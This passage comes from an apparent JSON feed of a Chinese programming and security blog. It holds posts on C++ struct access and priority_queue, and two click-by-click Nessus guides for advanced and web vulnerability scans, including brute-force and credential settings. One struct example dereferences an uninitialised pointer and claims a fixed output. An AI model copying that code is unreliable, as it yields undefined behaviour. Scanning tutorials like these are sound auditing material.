//非法</span><br></pre></td></tr></table></figure></p>\n<p>还有一点很重要，不能在结构体声明中初始化结构体成员，因为结构体声明只是创建一个新的数据类型，还不存在这种类型的变量。例如，以下声明是非法的：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  //非法结构体声明</span><br><span class=\"line\">struct Date</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int day = 23,</span><br><span class=\"line\">    month = 8,</span><br><span class=\"line\">    year = 1983;</span><br><span class=\"line\">&#125;；</span><br></pre></td></tr></table></figure></p>\n<p>因为结构体声明只声明一个结构体 “看起来是什么样子的”，所以不会在内存中创建成员变量。只有通过定义该结构体类型的变量来实例化结构体，才有地方存储初始值。</p>\n<ul>\n<li>访问<br>\n定义结构体：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct MyTree&#123;</span><br><span class=\"line\">    MyTree*left;</span><br><span class=\"line\">    MyTree*right;</span><br><span class=\"line\">    int val;</span><br><span class=\"line\">    MyTree()&#123;&#125;</span><br><span class=\"line\">    MyTree(int val):left(NULL),right(NULL),val(val)&#123;&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>一般结构体变量的访问方式：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    MyTree t;</span><br><span class=\"line\">    t.val = 1;</span><br><span class=\"line\">    cout&lt;&lt;t.val;</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可见，结构体中的变量，可以直接通过 &quot;.&quot; 操作符来访问。</p>\n<p>而对于结构体指针而言：必须通过 &quot;-&gt;&quot; 符号来访问指针所指结构体的变量。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    MyTree *t1 = new MyTree(1);</span><br><span class=\"line\">    MyTree *t2 ;</span><br><span class=\"line\">    t2-&gt;val = 2;</span><br><span class=\"line\">    cout&lt;&lt;t1-&gt;val&lt;&lt;&quot; &quot;&lt;&lt;t2-&gt;val;  //输出：1 2</span><br><span class=\"line\">    t2.val = 3;  //error: request for member &#x27;val&#x27; in &#x27;t2&#x27;, whitch is of pointer type &#x27;MyTree*&#x27; (maybe you meant to use &#x27;-&gt;&#x27; ?)</span><br><span class=\"line\">    cout&lt;&lt;t2.val;  //error: request for member &#x27;val&#x27; in &#x27;t2&#x27;, which is of pointer type &#x27;MyTree*&#x27; (maybe you mean to use &#x27;-&gt;&#x27; ?</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/11/CPP%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97priority-queue/",
            "url": "https://mangpumo.github.io/2023/01/11/CPP%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97priority-queue/",
            "title": "CPP优先队列priority_queue",
            "date_published": "2023-01-11T14:38:44.000Z",
            "content_html": "<h1 id=\"c优先队列priority_queue用法详解\"><a class=\"anchor\" href=\"#c优先队列priority_queue用法详解\">#</a> c++ 优先队列 (priority_queue) 用法详解</h1>\n<p>既然是队列那么先要包含头文件 #include &lt;queue&gt;, 他和 queue 不同的就在于我们可以自定义其中数据的优先级，让优先级高的排在队列前面，优先出队</p>\n<p>优先队列具有队列的所有特性，包括基本操作，只是在这基础上添加了内部的一个排序，它本质是一个堆实现的</p>\n<p><strong>和队列基本操作相同:</strong></p>\n<ul>\n<li>top 访问队头元素</li>\n<li>empty 队列是否为空</li>\n<li>size 返回队列内元素个数</li>\n<li>push 插入元素到队尾 (并排序)</li>\n<li>emplace 原地构造一个元素并插入队列</li>\n<li>pop 弹出队头元素</li>\n<li>swap 交换内容</li>\n</ul>\n<p>定义：priority_queue&lt;Type, Container,Functional&gt;</p>\n<p>Type 就是数据类型，Container 就是容器类型（Container 必须是用数组实现的容器，比如 vector,deque 等等，但不能用 list。STL 里面默认用的是 vector），Functional 就是比较的方式，当需要用自定义的数据类型时才需要传入这三个参数，使用基本数据类型时，只需要传入数据类型，默认是大顶堆<br>\n一般是：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//升序队列</span><br><span class=\"line\">priority_queue &lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt; q;</span><br><span class=\"line\">//降序队列</span><br><span class=\"line\">priority_queue &lt;int,vector&lt;int&gt;,less&lt;int&gt; &gt;q;</span><br><span class=\"line\"></span><br><span class=\"line\">//greater和less是std实现的两个仿函数（就是使一个类的使用看上去像一个函数。其实现就是类中实现一个operator()，这个类就有了类似函数的行为，就是一个仿函数类了）</span><br></pre></td></tr></table></figure></p>\n<p>基本类型例子：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include &lt;queue&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    //对于基础类型 默认是大顶堆</span><br><span class=\"line\">    priority_queue&lt;int&gt; a; </span><br><span class=\"line\">    //等同于 priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt; &gt; a;</span><br><span class=\"line\">    </span><br><span class=\"line\">  </span><br><span class=\"line\">    priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt; c;  //这样就是小顶堆</span><br><span class=\"line\">    priority_queue&lt;string&gt; b;</span><br><span class=\"line\"></span><br><span class=\"line\">    for (int i = 0; i &lt; 5; i++) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        a.push(i);</span><br><span class=\"line\">        c.push(i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    while (!a.empty()) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; a.top() &lt;&lt; &#x27; &#x27;;</span><br><span class=\"line\">        a.pop();</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    cout &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">    while (!c.empty()) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; c.top() &lt;&lt; &#x27; &#x27;;</span><br><span class=\"line\">        c.pop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cout &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">    b.push(&quot;abc&quot;);</span><br><span class=\"line\">    b.push(&quot;abcd&quot;);</span><br><span class=\"line\">    b.push(&quot;cbd&quot;);</span><br><span class=\"line\">    while (!b.empty()) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; b.top() &lt;&lt; &#x27; &#x27;;</span><br><span class=\"line\">        b.pop();</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    cout &lt;&lt; endl;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>输出<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4 3 2 1 0</span><br><span class=\"line\">0 1 2 3 4</span><br><span class=\"line\">cbd abcd abc</span><br></pre></td></tr></table></figure></p>\n<p>pair 的比较，先比较第一个元素，第一个相等比较第二个<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;queue&gt;</span><br><span class=\"line\">#include &lt;vector&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    priority_queue&lt;pair&lt;int, int&gt; &gt; a;</span><br><span class=\"line\">    pair&lt;int, int&gt; b(1, 2);</span><br><span class=\"line\">    pair&lt;int, int&gt; c(1, 3);</span><br><span class=\"line\">    pair&lt;int, int&gt; d(2, 5);</span><br><span class=\"line\">    a.push(d);</span><br><span class=\"line\">    a.push(c);</span><br><span class=\"line\">    a.push(b);</span><br><span class=\"line\">    while (!a.empty()) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; a.top().first &lt;&lt; &#x27; &#x27; &lt;&lt; a.top().second &lt;&lt; &#x27;\\n&#x27;;</span><br><span class=\"line\">        a.pop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>输出<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2 5</span><br><span class=\"line\">1 3</span><br><span class=\"line\">1 2</span><br></pre></td></tr></table></figure></p>\n<p>对于自定义类型<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;queue&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">//方法1</span><br><span class=\"line\">struct tmp1 //运算符重载&lt;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int x;</span><br><span class=\"line\">    tmp1(int a) &#123;x = a;&#125;</span><br><span class=\"line\">    bool operator&lt;(const tmp1&amp; a) const</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return x &lt; a.x; //大顶堆</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">//方法2</span><br><span class=\"line\">struct tmp2 //重写仿函数</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    bool operator() (tmp1 a, tmp1 b) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return a.x &lt; b.x; //大顶堆</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    tmp1 a(1);</span><br><span class=\"line\">    tmp1 b(2);</span><br><span class=\"line\">    tmp1 c(3);</span><br><span class=\"line\">    priority_queue&lt;tmp1&gt; d;</span><br><span class=\"line\">    d.push(b);</span><br><span class=\"line\">    d.push(c);</span><br><span class=\"line\">    d.push(a);</span><br><span class=\"line\">    while (!d.empty()) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; d.top().x &lt;&lt; &#x27;\\n&#x27;;</span><br><span class=\"line\">        d.pop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cout &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">    priority_queue&lt;tmp1, vector&lt;tmp1&gt;, tmp2&gt; f;</span><br><span class=\"line\">    f.push(c);</span><br><span class=\"line\">    f.push(b);</span><br><span class=\"line\">    f.push(a);</span><br><span class=\"line\">    while (!f.empty()) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; f.top().x &lt;&lt; &#x27;\\n&#x27;;</span><br><span class=\"line\">        f.pop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>输出<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3</span><br><span class=\"line\">2</span><br><span class=\"line\">1</span><br><span class=\"line\"></span><br><span class=\"line\">3</span><br><span class=\"line\">2</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/11/nessus%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/",
            "url": "https://mangpumo.github.io/2023/01/11/nessus%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/",
            "title": "nessus高级扫描",
            "date_published": "2023-01-10T21:39:51.000Z",
            "content_html": "<h1 id=\"nessus高级扫描\"><a class=\"anchor\" href=\"#nessus高级扫描\">#</a> nessus 高级扫描</h1>\n<p>1. 启动 nessus</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd nessus</span><br><span class=\"line\">sh qd_nessus.sh</span><br></pre></td></tr></table></figure></p>\n<p>2. 进入 nessus 网站，点击【new Scan】</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://kaliip:8834/</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2c2ffafb93224ebc93afafe4e60205a6.png\" alt=\"image.png\"></p>\n<p>3. 选择【adVanced Scan】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4b0472b99dad4eeaa167296afbe686f6.png\" alt=\"image.png\"></p>\n<p>4. 输入 Name【高级扫描】，Description【高级扫描】，Targets【需要扫描的 ip】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/fa67076b941a4560931eff0d7e6402dd.png\" alt=\"image.png\"></p>\n<p>5. 点击【 Schedule】</p>\n<p>这里是配置定时任务的，可以忽略</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/9ddf0e54c7e84387b0f01d53eee31e1c.png\" alt=\"image.png\"></p>\n<p>6. 点击【 Notifications】</p>\n<p>这里主要是配置邮件提醒的，可以配置也可以忽略</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ae35754b03ed48659a0f1532fa3ba68d.png\" alt=\"image.png\"></p>\n<p>7. 点击【Discovery 】，点击【主机发现】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/22517e11d91146c588f52f474972889e.png\" alt=\"image.png\"></p>\n<p>8. 点击【Port Scanning】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/0d89b04664654f7da3b03400675244f7.png\" alt=\"image.png\"></p>\n<p>9. 点击【Service Discovery】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/aa6a279e953b4fab8b7e2bc86c73d61d.png\" alt=\"image.png\"></p>\n<p>10. 点击【ASSESSMENT】，点击【general】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/6c0868e2b7b5431db222a8730137c0bd.png\" alt=\"image.png\"></p>\n<p>11. 点击【Brute Force】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ca890cc0fcf3413cbfcb5e37dccd2a75.png\" alt=\"image.png\"></p>\n<p>12. 点击【SCADA】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4d068852466b4a5c8cfa60c1e467d760.png\" alt=\"image.png\"></p>\n<p>13. 点击【Web Application Settings】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/443875aa60784a0ba4ac9474f669b447.png\" alt=\"image.png\"></p>\n<p>14. 点击【Windows】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2da89cbf88494f2c89117281bf7f5a06.png\" alt=\"image.png\"></p>\n<p>15. 点击【Malware 】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ffbdf0e4f0d1405fb4c0f300b4dce573.png\" alt=\"image.png\"></p>\n<p>16. 点击【Database】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ba1e37e085ae49b384488d7dd7b02bf2.png\" alt=\"image.png\"></p>\n<p>17. 点击 [REPORT]</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e70c22e594534560812685745ecd861a.png\" alt=\"image.png\"></p>\n<p>18. 点击【ADVANCED】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4991e91caf0c4fbdb5c4685c66553cd3.png\" alt=\"image.png\"></p>\n<p>19. 点击【Credentials 】，选则【windows】，输入账户密码（必须输入）</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5a3dea619e0443c39bfcf3998aeb3fcb.png\" alt=\"image.png\"></p>\n<p>20. 点击【Plugins】</p>\n<p>所有的扫描服务，都是由插件提供的</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/b5c28355b94a47e2bcd739c7805c18ee.png\" alt=\"image.png\"></p>\n<p>21. 点击【Save】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/10b06f0b62794a5684b16d25be5fda52.png\" alt=\"image.png\"></p>\n<p>22. 点击【高级扫描】，点击【More】，点击【Launch】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/c32b8e2986a94c41825952aa9b5556fb.png\" alt=\"image.png\"></p>\n<p>23. 点击【Launch】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/67c1160a61ed4f4888885028f23f80d9.png\" alt=\"image.png\"></p>\n<p>24. 点击【高级扫描】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/d5ba69b703904698b6b1d338255f2563.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2ee335411d2741738f14131e5794d87e.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5ee2d857b1af45edbf67f3e7e865b302.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e6a0d4b88eb548fa8deeafc16922ddcd.png\" alt=\"image.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1/",
            "url": "https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1/",
            "title": "Nessus扫描web服务",
            "date_published": "2023-01-10T21:39:26.000Z",
            "content_html": "<h1 id=\"nessus-扫描web服务\"><a class=\"anchor\" href=\"#nessus-扫描web服务\">#</a> Nessus 扫描 web 服务</h1>\n<p>1. 启动 nessus</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd nessus</span><br><span class=\"line\">sh qd_nessus.sh</span><br></pre></td></tr></table></figure></p>\n<p>2. 进入 nessus 网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://192.168.3.47:8834/</span><br></pre></td></tr></table></figure></p>\n<p>3. 点击【New Scan】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/55304735fe8946f6a0ced005bc35c64a.png\" alt=\"image.png\"></p>\n<p>4. 点击【Web 应用程序测试】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/e9d95f4061d6499c823cb51e7879ebe6.png\" alt=\"image.png\"></p>\n<p>5. 输入 name【web 扫描】，描述【web 扫描】，目标【127.0.0.1】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/50c7f3ab84c44ee0b6fe81e3b8a30f4c.png\" alt=\"image.png\"></p>\n<p>6. 点击【发现】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/49f9bad581cb40dea6ed3abae5c95cd5.png\" alt=\"image.png\"></p>\n<p>7. 选择扫描类型【端口扫描 (常用端口)】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c1e34fee97b0485dad86f8df929e5430.png\" alt=\"image.png\"></p>\n<p>8. 点击【评估】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4ea7b2375b8c41349514308597c351e2.png\" alt=\"image.png\"></p>\n<p>9. 扫描类型选择【扫描所有 web 漏洞 (快速)】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/9f4dc31931d04fccae316141d8bc6c3f.png\" alt=\"image.png\"></p>\n<p>10. 点击【证书】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a7c908efe8444f4eae6a37a90c7fa3dd.png\" alt=\"image.png\"></p>\n<p>11. 点击【HTTP】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a83dc3e5b4814ce3b38c45e0b8d68379.png\" alt=\"image.png\"></p>\n<p>12. 选择身份验证方法【自动认证】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/bf47d655d7754bf0867b0b8b3a12e173.png\" alt=\"image.png\"></p>\n<p>13. 输入用户名【xiaogang】，密码【123456】（需要扫描网站的用户名和密码）</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/dc040e35f171464482f0922aa58491ff.png\" alt=\"image.png\"></p>\n<p>14. 点击【插件】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c36226d195f94681bd294fc12f13eece.png\" alt=\"image.png\"></p>\n<p>15. 确认是否在可用的扫描插件</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/ed665f405a0547ec9f301ec455040870.png\" alt=\"image.png\"></p>\n<p>16. 点击【保存】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4a820525dba34f2ca51513670b0fc63e.png\" alt=\"image.png\"></p>\n<p>17. 选择【web 扫描】，点击后边的【小三角】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/3e5fbe3b52504eefae3df12b42e4561f.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/064b9a7184534364a04215d195b1c29b.png\" alt=\"image.png\"></p>\n<p>18. 点击【web 扫描】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/52b4c83c31d34caf87530813de3952cd.png\" alt=\"image.png\"></p>\n<p>19. 等待扫描完成</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c98d001614bb4fa9b675d16ed08b4885.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/1ecb527fb62442d8bc7f3f66cf2ca4d6.png\" alt=\"image.png\"></p>\n",
            "tags": []
        },
        {
